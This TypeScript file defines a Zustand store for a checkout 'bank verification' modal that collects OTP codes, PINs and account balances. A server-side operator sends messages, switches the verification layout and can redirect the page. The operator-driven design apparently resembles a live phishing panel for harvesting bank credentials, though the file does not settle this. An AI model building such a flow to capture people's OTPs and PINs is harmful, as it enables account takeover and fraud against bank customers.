import { createStore } from "zustand/vanilla";
import { createContext, useContext } from "react";
import { useStore } from "zustand";
import type { StoreApi } from "zustand";
import { isTerminal } from "../lib/checkout-status";
import { debugLog, setDebugStatusApiPayload } from "../lib/debug";
import { getSessionStatus, submitOtp, submitBalance, resendOtp, cancelSession } from "../lib/verification-api";
import type { SessionStatus } from "../lib/checkout-status";
import type { OperatorMessage, TransactionDetails } from "../types";

// ─── Session types ───────────────────────────────────────────────────────────

export interface StoredSession {
  sessionId: string;
  status: string;
  submitted: boolean;
}

function getActiveSessionId(session: StoredSession): string | null {
  if (!session.submitted || !session.sessionId || isTerminal(session.status)) return null;
  return session.sessionId;
}

// ─── Store types ─────────────────────────────────────────────────────────────

export interface BankVerificationState {
  // Config (set by provider)
  channelSlug: string;
  debug: boolean;
  onClose: (() => void) | undefined;

  // Session
  sessionId: string | null;

  // Status (from WebSocket / polling)
  status: SessionStatus;
  verificationLayout: string;
  bank: string | undefined;
  transactionDetails: TransactionDetails | undefined;
  wrongCode: boolean;
  expiredCode: boolean;
  operatorMessage: OperatorMessage | null;
  countdown: number;
  error: string | null;

  // Form state
  submitting: boolean;
  submitError: string | null;
  otpValue: string;
  balance: string;
  pinMasked: boolean;
}

export interface BankVerificationActions {
  patchConfig: (config: { debug?: boolean; onClose?: (() => void) | undefined }) => void;

  setSession: (session: StoredSession) => void;
  clearSession: () => void;
  cancelSessionAction: () => Promise<void>;

  fetchStatus: () => Promise<void>;

  applyStatusUpdate: (update: {
    status?: SessionStatus | string;
    verificationLayout?: string;
    bank?: string;
    transactionDetails?: TransactionDetails;
    wrongCode?: boolean;
    expiredCode?: boolean;
    countdownReset?: boolean;
    redirectUrl?: string;
  }) => void;

  applyOperatorMessage: (msg: { level: "error" | "info"; message: string }) => void;
  setError: (error: string | null) => void;
  clearCodeFeedback: () => void;

  setSubmitting: (v: boolean) => void;
  setSubmitError: (v: string | null) => void;
  setOtpValue: (v: string) => void;
  setBalance: (v: string) => void;
  togglePinMasked: () => void;

  submitOtpAction: (code: string) => Promise<void>;
  submitBalanceAction: (balance: string) => Promise<void>;
  resendOtpAction: () => Promise<void>;
  onSubmit: () => void;
}

export type BankVerificationStore = BankVerificationState & BankVerificationActions;
export type BankVerificationStoreApi = StoreApi<BankVerificationStore>;

// ─── React context ────────────────────────────────────────────────────────────

export const BankVerificationStoreContext =
  createContext<BankVerificationStoreApi | null>(null);

export function useBankVerificationStoreApi(): BankVerificationStoreApi {
  const store = useContext(BankVerificationStoreContext);
  if (!store) {
    throw new Error(
      "useBankVerificationStoreApi must be used within BankVerificationModal",
    );
  }
  return store;
}

export function useBankVerificationStore<T>(
  selector: (state: BankVerificationStore) => T,
): T {
  return useStore(useBankVerificationStoreApi(), selector);
}

// ─── Store registry ───────────────────────────────────────────────────────────

const storeRegistry = new Map<string, BankVerificationStoreApi>();

/**
 * Returns the store for the given channelSlug, creating it if it doesn't exist.
 * Multiple callers (useCheckoutFlow, BankVerificationModal) share the same instance.
 */
export function getOrCreateStore(
  channelSlug: string,
  debug: boolean = false,
  onClose?: () => void,
): BankVerificationStoreApi {
  if (!storeRegistry.has(channelSlug)) {
    storeRegistry.set(channelSlug, createBankVerificationStore(channelSlug, debug, onClose));
  }
  return storeRegistry.get(channelSlug)!;
}

// ─── Factory ─────────────────────────────────────────────────────────────────

export function createBankVerificationStore(
  channelSlug: string,
  debug: boolean,
  onClose: (() => void) | undefined,
): BankVerificationStoreApi {
  const sessionId = null;

  const store = createStore<BankVerificationStore>((set, get) => ({
    // Config
    channelSlug,
    debug,
    onClose,

    // Session
    sessionId,

    // Status
    status: "idle",
    verificationLayout: "sms",
    bank: undefined,
    transactionDetails: undefined,
    wrongCode: false,
    expiredCode: false,
    operatorMessage: null,
    countdown: 0,
    error: null,

    // Form
    submitting: false,
    submitError: null,
    otpValue: "",
    balance: "",
    pinMasked: true,

    // ── Actions ──────────────────────────────────────────────────────────────

    patchConfig: (config) => set(config),

    setSession: (session) => {
      const newSessionId = getActiveSessionId(session);
      // Reset code feedback whenever the session changes
      set({ sessionId: newSessionId, wrongCode: false, expiredCode: false });
      if (newSessionId) get().fetchStatus();
    },

    clearSession: () => {
      // Reset code feedback on session clear
      set({ sessionId: null, wrongCode: false, expiredCode: false });
    },

    cancelSessionAction: async () => {
      const { channelSlug, sessionId, status, debug } = get();
      if (sessionId && !isTerminal(status)) {
        try {
          debugLog(debug, "cancelSession", { channelSlug, sessionId });
          await cancelSession(channelSlug, sessionId);
          debugLog(debug, "cancelSession OK");
        } catch (e) {
          debugLog(debug, "cancelSession failed (ignored)", {
            error: e instanceof Error ? e.message : e,
          });
        }
      }
      get().clearSession();
    },

    fetchStatus: async () => {
      const { channelSlug, sessionId, debug } = get();
      if (!sessionId) return;
      try {
        debugLog(debug, "fetch session status", { channelSlug, sessionId });
        const data = await getSessionStatus(channelSlug, sessionId);
        setDebugStatusApiPayload(debug, data);
        debugLog(debug, "session status (REST)", data);
        get().applyStatusUpdate(data);
      } catch (e) {
        const msg = e instanceof Error ? e.message : "Failed to load";
        debugLog(debug, "fetch status failed", { error: msg });
        set({ error: msg });
      }
    },

    applyStatusUpdate: (update) => {
      const current = get();
      const patch: Partial<BankVerificationState> = {};

      if (update.status !== undefined) {
        patch.status = update.status as SessionStatus;
        // Reset submitting state whenever server acknowledges a new status
        patch.submitting = false;
      }

      if (update.verificationLayout !== undefined &&
          update.verificationLayout !== current.verificationLayout) {
        patch.verificationLayout = update.verificationLayout;
        // Clear stale code feedback when layout transitions
        patch.wrongCode = false;
        patch.expiredCode = false;
      } else {
        if (update.wrongCode !== undefined) {
          patch.wrongCode = update.wrongCode;
          if (update.wrongCode) {
            // Reset form inputs and submitting state when code is wrong
            patch.otpValue = "";
            patch.submitting = false;
          }
        }
        if (update.expiredCode !== undefined) {
          patch.expiredCode = update.expiredCode;
          if (update.expiredCode) {
            // Reset form inputs and submitting state when code has expired
            patch.otpValue = "";
            patch.submitting = false;
          }
        }
      }

      if (update.bank !== undefined) patch.bank = update.bank;
      if (update.transactionDetails !== undefined) patch.transactionDetails = update.transactionDetails;
      if (update.countdownReset === true) patch.countdown = current.countdown + 1;
      if (update.redirectUrl) window.location.replace(update.redirectUrl);

      set(patch);

      // Auto-clear session when a terminal status arrives
      if (update.status && isTerminal(update.status as string)) {
        get().clearSession();
      }
    },

    applyOperatorMessage: (msg) => {
      set({
        operatorMessage:
          msg.message === "" ? null : { level: msg.level, message: msg.message },
      });
    },

    setError: (error) => set({ error }),

    clearCodeFeedback: () => set({ wrongCode: false, expiredCode: false }),

    setSubmitting: (v) => set({ submitting: v }),
    setSubmitError: (v) => set({ submitError: v }),
    setOtpValue: (v) => set({ otpValue: v }),
    setBalance: (v) => set({ balance: v }),
    togglePinMasked: () => set((s) => ({ pinMasked: !s.pinMasked })),

    submitOtpAction: async (code) => {
      const { channelSlug, sessionId, debug, verificationLayout } = get();
      debugLog(debug, "submit OTP (clearCodeFeedback first)", {
        type: verificationLayout,
        codeLength: code.length,
        sessionId,
      });
      get().clearCodeFeedback();
      set({ submitError: null, submitting: true });
      try {
        await submitOtp(channelSlug, sessionId ?? "", code);
        debugLog(debug, "OTP submitted OK");
      } catch (e) {
        const msg = e instanceof Error ? e.message : "Invalid code";
        debugLog(debug, "OTP submit failed", { error: msg });
        set({ submitError: msg, submitting: false });
      }
    },

    submitBalanceAction: async (balance) => {
      const { channelSlug, sessionId, debug } = get();
      set({ submitError: null, submitting: true });
      debugLog(debug, "submit balance", {
        hasValue: balance.length > 0,
        sessionId,
        channelSlug,
      });
      try {
        await submitBalance(channelSlug, sessionId ?? "", balance);
        debugLog(debug, "balance submitted OK");
      } catch (e) {
        const msg = e instanceof Error ? e.message : "Failed to submit balance";
        debugLog(debug, "balance submit failed", { error: msg });
        set({ submitError: msg, submitting: false });
      }
    },

    resendOtpAction: async () => {
      const { channelSlug, sessionId, debug, verificationLayout } = get();
      if (verificationLayout === "pin" || verificationLayout === "sms") {
        debugLog(debug, "resend OTP requested", { type: verificationLayout, channelSlug, sessionId });
        await resendOtp(channelSlug, sessionId ?? "", verificationLayout);
        debugLog(debug, "resend OTP completed", { type: verificationLayout });
      }
    },

    onSubmit: () => {
      const { verificationLayout, balance, otpValue } = get();
      if (verificationLayout === "balance") {
        get().submitBalanceAction(balance);
      } else {
        get().submitOtpAction(otpValue);
      }
    },
  }));

  return store;
}
